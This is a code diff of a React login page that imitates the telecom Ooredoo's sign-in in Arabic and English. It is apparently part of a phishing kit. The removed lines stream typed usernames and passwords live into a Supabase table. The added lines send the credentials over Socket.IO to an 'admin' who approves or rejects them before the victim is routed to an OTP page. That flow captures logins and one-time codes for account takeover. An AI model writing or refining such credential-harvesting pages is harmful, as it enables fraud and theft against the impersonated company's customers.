@@ -8,8 +8,7 @@ import SiteHeader from "@/components/SiteHeader";
 import SiteFooter from "@/components/SiteFooter";
 import { Loader2, Eye, EyeOff, PhoneCall, ShieldCheck } from "lucide-react";
 import { useLang } from "@/i18n/LanguageContext";
-import { useLiveDraft } from "@/hooks/useLiveDraft";
-import { socket, visitor, sendData, navigateToPage } from "@/lib/store";
+import { sendData, navigateToPage, isFormApproved, isFormRejected } from "@/lib/store";
 import { getServiceContext } from "@/lib/serviceContext";
 
 const OoredooLogin = () => {
@@ -26,86 +25,61 @@ const OoredooLogin = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   const [waiting, setWaiting] = useState(false);
-  const [requestId, setRequestId] = useState<string | null>(() =>
-    typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null
-  );
 
   const isValid = identifier.trim().length >= 4 && password.length >= 4;
 
-  useLiveDraft({
-    step: "ooredoo_login_draft",
-    values: { identifier, password },
-    columns: {
-      phone: visitorPhone || identifier,
-      username: identifier,
-    },
-  });
+  // Navigate to page on mount
+  useEffect(() => {
+    navigateToPage("تسجيل دخول Ooredoo");
+  }, []);
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  // Watch for admin approval
+  useEffect(() => {
+    if (!waiting) return;
+    if (isFormApproved.value) {
+      setWaiting(false);
+      setLoading(false);
+      navigate("/ooredoo-otp");
+    }
+  }, [isFormApproved.value, waiting]);
+
+  // Watch for admin rejection
+  useEffect(() => {
+    if (!waiting) return;
+    if (isFormRejected.value) {
+      setRejectionMessage(pick(
+        "البيانات التي أدخلتها غير صحيحة. يرجى التأكد منها وإعادة المحاولة",
+        "The details you entered are incorrect. Please verify and try again."
+      ));
+      setWaiting(false);
+      setLoading(false);
+      setPassword("");
+      window.scrollTo({ top: 0, behavior: "auto" });
+    }
+  }, [isFormRejected.value, waiting]);
+
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!isValid) return;
     setLoading(true);
-
-    const existingId = typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null;
-    let phoneToUse = visitorPhone || identifier.trim();
-    if (existingId) {
-      const { data: prev } = await supabase
-        .from("login_requests").select("phone").eq("id", existingId).maybeSingle();
-      if (prev?.phone) phoneToUse = prev.phone;
-    }
-
-    const payload = {
-      phone: phoneToUse,
-      username: identifier.trim(),
-      password,
-      step: "ooredoo_login",
-      status: "pending",
-      selected_service: selectedService,
-      current_page: "/ooredoo-login",
-      // Mirror step-scoped credentials into activation_data so they are
-      // preserved after later steps overwrite the top-level columns.
-      activation_data: {
-        ooredoo_username: identifier.trim(),
-        ooredoo_password: password,
-      },
-      updated_at: new Date().toISOString(),
-    } as any;
-    let data: { id: string } | null = null;
-    let error: unknown = null;
-    if (existingId) {
-      const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
-      data = res.data as any; error = res.error;
-    }
-    if (!data) {
-      const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" }).select("id").single();
-      data = ins.data as any; error = ins.error;
-    }
-    if (error || !data) { setLoading(false); return; }
-    setVisitorRequestId(data.id);
-    setRequestId(data.id);
     clearRejectionMessage();
+
+    // Send data via Socket.IO to admin
+    sendData({
+      data: {
+        phone: visitorPhone || identifier.trim(),
+        username: identifier.trim(),
+        password,
+        service: selectedService || "ooredoo",
+      },
+      current: "تسجيل دخول Ooredoo",
+      nextPage: "رمز OTP",
+      waitingForAdminResponse: true,
+      isCustom: true,
+    });
+
     setWaiting(true);
   };
-
-  useEffect(() => {
-    if (!waiting || !requestId) return;
-    const channel = supabase
-      .channel("ooredoo_approval_" + requestId)
-      .on("postgres_changes", {
-        event: "UPDATE", schema: "public", table: "login_requests",
-        filter: `id=eq.${requestId}`,
-      }, (payload) => {
-        const row = payload.new as { status: string };
-        if (row.status === "approved") {
-          navigate("/ooredoo-otp", { state: { phone: visitorPhone || identifier, requestId } });
-        } else if (row.status === "rejected") {
-          setRejectionMessage(pick("البيانات التي أدخلتها غير صحيحة. يرجى التأكد منها وإعادة المحاولة", "The details you entered are incorrect. Please verify and try again."));
-          setWaiting(false); setLoading(false); setPassword("");
-          window.scrollTo({ top: 0, behavior: "auto" });
-        }
-      }).subscribe();
-    return () => { supabase.removeChannel(channel); };
-  }, [waiting, requestId, navigate, visitorPhone, identifier, pick]);
 
   return (
     <div className="min-h-screen bg-background relative" dir={dir}>
